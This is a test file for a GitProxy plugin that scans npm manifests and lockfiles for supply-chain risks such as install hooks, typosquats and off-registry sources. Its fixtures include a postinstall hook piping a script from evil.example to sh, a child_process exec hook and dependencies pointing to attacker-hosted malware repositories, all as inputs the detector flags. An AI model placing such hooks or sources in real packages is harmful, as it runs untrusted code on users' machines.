/**
 * Copyright 2026 GitProxy Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { describe, it, expect } from 'vitest';
import { analyzeNpm } from '../../../plugins/git-proxy-plugin-supply-chain/lib/ecosystems/npm.js';
import { resolveConfig } from '../../../plugins/git-proxy-plugin-supply-chain/lib/config.js';

const config = resolveConfig();

const pkg = (obj: object) => JSON.stringify(obj);

const scanManifest = (next: object, prev: object | null = {}) =>
  analyzeNpm({
    path: 'package.json',
    kind: 'manifest',
    oldContent: prev === null ? null : pkg(prev),
    newContent: pkg(next),
    config,
  });

const rules = (findings: { rule: string }[]) => findings.map((f) => f.rule);
const byRule = (findings: { rule: string }[], rule: string) =>
  findings.filter((f) => f.rule === rule);

describe('npm analyzer - install scripts', () => {
  it('flags a newly added postinstall hook as HIGH', () => {
    const findings = scanManifest({ scripts: { postinstall: 'node ./setup.js' } }, {});
    const script = byRule(findings, 'install-script');
    expect(script).toHaveLength(1);
    expect(script[0].severity).toBe('high');
    expect(script[0].title).toContain('added');
  });

  it('escalates a dangerous postinstall (curl | sh) to CRITICAL', () => {
    const findings = scanManifest(
      { scripts: { postinstall: 'curl http://evil.example/x.sh | sh' } },
      {},
    );
    const script = byRule(findings, 'install-script');
    expect(script[0].severity).toBe('critical');
    expect(script[0].detail).toContain('pipes a downloaded payload');
  });

  it('flags a modified install hook with the "modified" verb', () => {
    const findings = scanManifest(
      { scripts: { postinstall: 'node ./b.js' } },
      { scripts: { postinstall: 'node ./a.js' } },
    );
    const script = byRule(findings, 'install-script');
    expect(script).toHaveLength(1);
    expect(script[0].title).toContain('modified');
  });

  it('does not flag an unchanged benign lifecycle script', () => {
    const findings = scanManifest(
      { scripts: { postinstall: 'node ./same.js' } },
      { scripts: { postinstall: 'node ./same.js' } },
    );
    expect(byRule(findings, 'install-script')).toHaveLength(0);
  });

  it('still surfaces an unchanged but dangerous existing hook', () => {
    const dangerous = "node -e \"require('child_process').exec('id')\"";
    const findings = scanManifest(
      { scripts: { preinstall: dangerous } },
      { scripts: { preinstall: dangerous } },
    );
    const script = byRule(findings, 'install-script');
    expect(script).toHaveLength(1);
    expect(script[0].severity).toBe('high');
    expect(script[0].title).toContain('existing');
  });

  it('ignores non-lifecycle scripts such as test/build', () => {
    const findings = scanManifest({ scripts: { test: 'jest', build: 'tsc' } }, {});
    expect(byRule(findings, 'install-script')).toHaveLength(0);
  });
});

describe('npm analyzer - dependency sources', () => {
  it('flags a newly added git-source dependency as HIGH', () => {
    const findings = scanManifest(
      { dependencies: { thing: 'git+https://github.com/x/thing.git' } },
      {},
    );
    const src = byRule(findings, 'non-registry-source');
    expect(src).toHaveLength(1);
    expect(src[0].severity).toBe('high');
    expect(src[0].title).toContain('(git)');
  });

  it('flags an http tarball and a github shorthand as non-registry sources', () => {
    const findings = scanManifest(
      {
        dependencies: {
          a: 'https://example.com/a.tgz',
          b: 'user/repo#main',
        },
      },
      {},
    );
    expect(byRule(findings, 'non-registry-source')).toHaveLength(2);
  });

  it('flags an unpinned/wildcard version as MEDIUM', () => {
    const findings = scanManifest({ dependencies: { a: '*', b: 'latest' } }, {});
    const loose = byRule(findings, 'loose-version');
    expect(loose).toHaveLength(2);
    expect(loose[0].severity).toBe('medium');
  });

  it('does not flag a normal pinned registry dependency source', () => {
    const findings = scanManifest({ dependencies: { lodash: '^4.17.21' } }, {});
    expect(byRule(findings, 'non-registry-source')).toHaveLength(0);
    expect(byRule(findings, 'loose-version')).toHaveLength(0);
  });

  it('skips dependencies that are unchanged between old and new', () => {
    const findings = scanManifest(
      { dependencies: { lodash: '^4.17.21', 'git-dep': 'git+https://x/y.git' } },
      { dependencies: { lodash: '^4.17.21', 'git-dep': 'git+https://x/y.git' } },
    );
    expect(findings).toHaveLength(0);
  });
});

describe('npm analyzer - typosquats', () => {
  it('flags a newly added typosquat of a popular package', () => {
    const findings = scanManifest({ dependencies: { expresss: '^4.0.0' } }, {});
    const typo = byRule(findings, 'typosquat');
    expect(typo).toHaveLength(1);
    expect(typo[0].severity).toBe('high');
    expect(typo[0].title).toContain('express');
  });

  it('does not flag an exact popular package name', () => {
    const findings = scanManifest({ dependencies: { express: '^4.0.0' } }, {});
    expect(byRule(findings, 'typosquat')).toHaveLength(0);
  });

  it('does not flag a clearly-unique internal package', () => {
    const findings = scanManifest(
      { dependencies: { 'acme-internal-widget-service': '^1.0.0' } },
      {},
    );
    expect(byRule(findings, 'typosquat')).toHaveLength(0);
  });

  it('respects allowPackages', () => {
    const findings = analyzeNpm({
      path: 'package.json',
      kind: 'manifest',
      oldContent: pkg({}),
      newContent: pkg({ dependencies: { expresss: '^4.0.0' } }),
      config: resolveConfig({ allowPackages: ['expresss'] }),
    });
    expect(byRule(findings, 'typosquat')).toHaveLength(0);
  });
});

describe('npm analyzer - aggregate + parsing', () => {
  it('emits a single INFO listing newly added dependencies', () => {
    const findings = scanManifest(
      { dependencies: { a: '^1.0.0', b: '^2.0.0' }, devDependencies: { c: '^3.0.0' } },
      { dependencies: { a: '^1.0.0' } },
    );
    const info = byRule(findings, 'new-dependencies');
    expect(info).toHaveLength(1);
    expect(info[0].severity).toBe('info');
    expect(info[0].detail).toContain('b');
    expect(info[0].detail).toContain('c');
    expect(info[0].detail).not.toContain('a (dependencies)');
  });

  it('reports unparseable package.json as LOW without throwing', () => {
    const findings = analyzeNpm({
      path: 'package.json',
      kind: 'manifest',
      oldContent: null,
      newContent: '{ not valid json ',
      config,
    });
    expect(rules(findings)).toContain('unparseable-manifest');
    expect(findings[0].severity).toBe('low');
  });

  it('treats a missing old version as an entirely new manifest', () => {
    const findings = scanManifest({ scripts: { postinstall: 'node x.js' } }, null);
    expect(byRule(findings, 'install-script')).toHaveLength(1);
  });
});

describe('npm analyzer - non-registry source variants (review hardening)', () => {
  it('flags scp-style SSH shorthand git dependencies', () => {
    const findings = scanManifest(
      { dependencies: { evil: 'git@github.com:attacker/malware.git' } },
      {},
    );
    const src = byRule(findings, 'non-registry-source');
    expect(src).toHaveLength(1);
    expect(src[0].title).toContain('(git)');
  });

  it('flags ssh:// git dependencies', () => {
    const findings = scanManifest(
      { dependencies: { evil: 'ssh://git@github.com/attacker/malware.git' } },
      {},
    );
    expect(byRule(findings, 'non-registry-source')).toHaveLength(1);
  });

  it('flags a git source forced via yarn resolutions', () => {
    const findings = scanManifest(
      { resolutions: { lodash: 'git+https://attacker.example/malware.git' } },
      {},
    );
    const src = byRule(findings, 'override-source');
    expect(src).toHaveLength(1);
    expect(src[0].severity).toBe('high');
    expect(src[0].title).toContain('resolutions');
  });

  it('flags a git source forced via nested npm overrides', () => {
    const findings = scanManifest(
      { overrides: { foo: { '.': '1.0.0', bar: 'git+ssh://git@x/y.git' } } },
      {},
    );
    const src = byRule(findings, 'override-source');
    expect(src).toHaveLength(1);
    expect(src[0].detail).toContain('foo/bar');
  });

  it('flags a git source forced via pnpm.overrides', () => {
    const findings = scanManifest(
      { pnpm: { overrides: { 'a>b': 'https://attacker.example/b.tgz' } } },
      {},
    );
    expect(byRule(findings, 'override-source')).toHaveLength(1);
  });

  it('does not flag unchanged override entries', () => {
    const prev = { resolutions: { lodash: 'git+https://x/y.git' } };
    const findings = scanManifest({ resolutions: { lodash: 'git+https://x/y.git' } }, prev);
    expect(byRule(findings, 'override-source')).toHaveLength(0);
  });
});

describe('npm analyzer - lockfiles', () => {
  const scanLock = (path: string, next: string, prev: string | null = null) =>
    analyzeNpm({ path, kind: 'lockfile', oldContent: prev, newContent: next, config });

  it('flags a newly added off-registry resolved url as MEDIUM', () => {
    const findings = scanLock(
      'package-lock.json',
      '{ "packages": { "node_modules/x": { "resolved": "https://evil.example.com/x.tgz" } } }',
    );
    const off = byRule(findings, 'lockfile-offregistry-source');
    expect(off).toHaveLength(1);
    expect(off[0].severity).toBe('medium');
  });

  it('flags a git source and a plain-http source as HIGH', () => {
    const findings = scanLock(
      'yarn.lock',
      'a:\n  resolved "git+https://github.com/x/y.git#abc"\nb:\n  resolved "http://insecure.example.com/b.tgz"\n',
    );
    expect(byRule(findings, 'lockfile-git-source')).toHaveLength(1);
    expect(byRule(findings, 'lockfile-insecure-source')).toHaveLength(1);
  });

  it('does not flag official-registry resolved urls', () => {
    const findings = scanLock(
      'package-lock.json',
      '{ "packages": { "node_modules/lodash": { "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz" } } }',
    );
    expect(findings).toHaveLength(0);
  });

  it('does not re-flag a resolved url that was already present', () => {
    const url = 'https://evil.example.com/x.tgz';
    const content = `{ "packages": { "node_modules/x": { "resolved": "${url}" } } }`;
    const findings = scanLock('package-lock.json', content, content);
    expect(findings).toHaveLength(0);
  });

  it('flags pnpm unquoted tarball scalars (off-registry)', () => {
    const findings = scanLock(
      'pnpm-lock.yaml',
      '  /foo@1.0.0:\n    resolution: {tarball: https://evil.example.com/foo.tgz}\n',
    );
    expect(byRule(findings, 'lockfile-offregistry-source')).toHaveLength(1);
  });

  it('flags pnpm unquoted git url scalars', () => {
    const findings = scanLock(
      'pnpm-lock.yaml',
      '  /foo@1.0.0:\n    resolution: {type: git, url: git+https://github.com/attacker/malware.git}\n',
    );
    expect(byRule(findings, 'lockfile-git-source')).toHaveLength(1);
  });

  it('does not flag pnpm registry entries (integrity only, no url)', () => {
    const findings = scanLock(
      'pnpm-lock.yaml',
      '  /lodash@4.17.21:\n    resolution: {integrity: sha512-abc123==}\n',
    );
    expect(findings).toHaveLength(0);
  });
});
